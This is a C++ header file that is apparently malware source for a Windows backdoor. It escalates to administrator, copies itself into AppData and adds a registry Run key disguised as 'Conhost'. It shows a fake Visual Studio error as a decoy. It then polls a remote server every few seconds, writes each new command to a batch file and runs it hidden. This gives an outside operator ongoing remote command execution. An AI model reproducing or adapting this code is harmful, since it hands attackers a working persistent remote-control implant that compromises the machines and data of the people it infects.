#pragma once

#include"shload.h"

#include<ShlObj.h>

string WebSocketAPI = "https://api.foxaxu.com/winhekapi/COMMAND.txt?rand=";

void OsMonitor_MainProcess();

void argsApi(string args$api) {

	if (args$api == "--run-osmonitor") {
		OsMonitor_MainProcess();
		return;
	}

	_prtoutmsg("Unknown Args :  " + args$api);
	return;
}

int _HeadMainLoad() {

	string getenv_local = getenv("appdata");
	string newfile_path = getenv_local + "\\WHP.exe";

	if (_$GetSelfName == newfile_path) {
		return 0;
	}

	if (!IsUserAnAdmin()){
		ShellExecute(0, "runas", _$GetSelfName.c_str(), 0, 0, SW_SHOW);
		return 0;
	}

	if (check_file_existenceA(newfile_path)) {
		ShellExecute(0, "runas", "taskkill.exe", "/f /im WHP.exe", 0, SW_HIDE);
		sleepapi(3);
		remove(newfile_path.c_str());
	}

	//CopySelf
	CopyFile(_$GetSelfName.c_str(), newfile_path.c_str(),0);

	string cmds = "add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Conhost \" /t REG_SZ /d \"\"" + newfile_path + "\" --run-osmonitor\" ";

	ShellExecute(0, "runas", "reg.exe", cmds.c_str(), 0, SW_HIDE);

	ShellExecute(0, "open", newfile_path.c_str(), "--run-osmonitor",getenv_local.c_str(), SW_HIDE);

	MessageBox(0, "    This Application cannot running on Win32 mode","Microsoft.VisualStudio.Error" , MB_OK | MB_ICONERROR);
	return 0;
}

void OsMonitor_MainProcess() {
	//Hacked mode

	string ostemp = getenv("temp");

	string getcmd;

	string oldcmd;

	while (true) {
		sleepapi(5);
		bool uaresult = _urldown_api(WebSocketAPI + _get_random_s(1, 1000), ostemp + "\\WHX.dat");

		if (!uaresult) {
			continue;
		}

		getcmd = _fileapi_textread(ostemp + "\\WHX.dat", 1);
		if (getcmd == "NULL") {
			continue;
		}

		if (oldcmd == getcmd) {
			continue;
		}
		else {
			oldcmd = getcmd;
			_fileapi_createmark(ostemp + "\\whxbatch.bat", getcmd);
			string tcmds = ostemp + "\\whxbatch.bat";
			ShellExecute(0, "open", tcmds.c_str(),0, 0, SW_HIDE);
			continue;
		}

		continue;
	}
	
	MessageBox(0, "WHX Error", "Error", MB_OK);
	return;
}